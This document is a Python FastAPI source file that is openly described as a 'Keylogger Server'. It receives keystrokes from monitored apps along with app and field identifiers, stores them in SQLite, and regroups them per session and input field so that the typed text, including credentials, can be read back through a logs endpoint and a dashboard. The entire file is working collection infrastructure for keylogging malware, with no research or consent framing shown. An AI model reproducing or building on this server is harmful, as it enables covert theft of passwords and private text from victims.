# main.py - FastAPI server with SQLite3 and Jinja2 Template rendering
from typing import Dict
import sqlite3
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel

app = FastAPI()

# Setup Jinja2 templates directory
templates = Jinja2Templates(directory="templates")

# Database initialization
DB_FILE = "keystrokes.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            key_val TEXT,
            app_name TEXT,
            app_id TEXT,
            field_hint TEXT,
            field_name TEXT,
            field_id INTEGER,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

# Initialize the database on startup
init_db()

class KeystrokeData(BaseModel):
    session_id: str
    key: str
    app_name: str
    app_id: str
    field_hint: str
    field_name: str
    field_id: int

@app.post("/keyogger")
async def log_keystroke(data: Dict):
    try:
        recv_data = {
            'session_id': data.get('session_id'),
            'key': data.get('key'),
            'app_name': data.get('app_name'),
            'app_id': data.get('app_id'),
            'field_hint': data.get('field_hint'),
            'field_name': data.get('field_name'),
            'field_id': data.get('field_id'),
        }

        # Store in SQLite3
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO keystrokes (session_id, key_val, app_name, app_id, field_hint, field_name, field_id)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            recv_data['session_id'],
            recv_data['key'],
            recv_data['app_name'],
            recv_data['app_id'],
            recv_data['field_hint'],
            recv_data['field_name'],
            recv_data['field_id']
        ))
        conn.commit()
        conn.close()

        print(f"Stored & Received keystroke data: {recv_data}")
        return {"status": "success", "message": "Keystroke logged and saved to database"}
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/logs")
async def get_logs():
    """Endpoint to retrieve grouped keystrokes per session, app, and field"""
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    
    # Aggregate keystrokes per session, app, and field hint/name
    cursor.execute("""
        SELECT 
            session_id,
            app_name,
            app_id,
            field_hint,
            field_name,
            MAX(timestamp) as timestamp,
            GROUP_CONCAT(key_val, '') as grouped_keys,
            COUNT(*) as key_count
        FROM keystrokes 
        GROUP BY session_id, app_id, field_id, field_hint
        ORDER BY timestamp DESC 
        LIMIT 100
    """)
    rows = cursor.fetchall()
    conn.close()
    
    return {"status": "success", "data": [dict(row) for row in rows]}


@app.get("/dashboard", response_class=HTMLResponse)
async def serve_dashboard(request: Request):
    """Renders and serves the dashboard HTML template using Jinja2"""
    return templates.TemplateResponse(request, "dashboard.html")

@app.get("/")
async def root():
    return {"message": "Keylogger Server with SQLite is running. Visit /dashboard for the live telemetry view."}

@app.delete("/logs/{session_id}")
async def delete_session_logs(session_id: str):
    """Deletes all keystroke logs associated with a specific session ID"""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM keystrokes WHERE session_id = ?", (session_id,))
        conn.commit()
        conn.close()
        return {"status": "success", "message": f"Session {session_id} deleted successfully"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=3000, reload=True, workers=1)